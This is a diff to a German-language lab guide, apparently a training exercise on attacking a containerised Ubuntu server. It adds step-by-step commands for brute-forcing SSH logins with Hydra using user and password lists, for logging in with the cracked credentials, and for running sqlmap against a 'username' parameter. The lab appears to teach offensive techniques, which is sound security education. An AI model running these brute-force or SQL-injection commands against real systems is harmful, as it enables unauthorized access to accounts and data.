@@ -139,24 +139,25 @@ _password\_cracking\_\<Komponente>\_\<x>_ <br>
 
   Der Befehl um Hydra zu starten lautet wie folgt:
   ```
-  hydra -L
+  hydra -L users.txt -P passwords.txt ssh://<IP des ssh-services> -V -f
   ```
+  - auf -L folgt die Listeneingabe der User
+  - auf -P folgt die Listeneingabe der möglichen Passwörter
+  - -V loggt die Versuche & -f bricht hydra ab, sobald ein Passwort gefunden wurde.
 
-  
-    
-    
-- <h3 style="color:lightblue">Schritt 1.3</h3>
-    
-   
-    
-- <h3 style="color:lightblue">Schritt 1.4</h3>
-    
-    
+hydra zeigt einem dann abschließend Username und Passwort wenn der Versuch erfolgreich abgeschlossen wurde.
+Um dies zu bestätigen können Sie nun mit den Informationen versuchen, eine ssh-Verbindung auf den Ubuntu Server herzustellen:
+```
+ssh <Username>@<IP des Ubuntu Containers>
+```
 
 <h2 style="color:red">  2. Part: SQL-Injection </h2>
 
 - <h3 style="color:lightblue">Schritt 2.1</h3>
 
+  ```
+  sqlmap -r sqli_post_request -p "username"
+  ```
 
 <h2 style="color:red">  3. Part: OFFLINE Passwort-Cracking </h2>
 
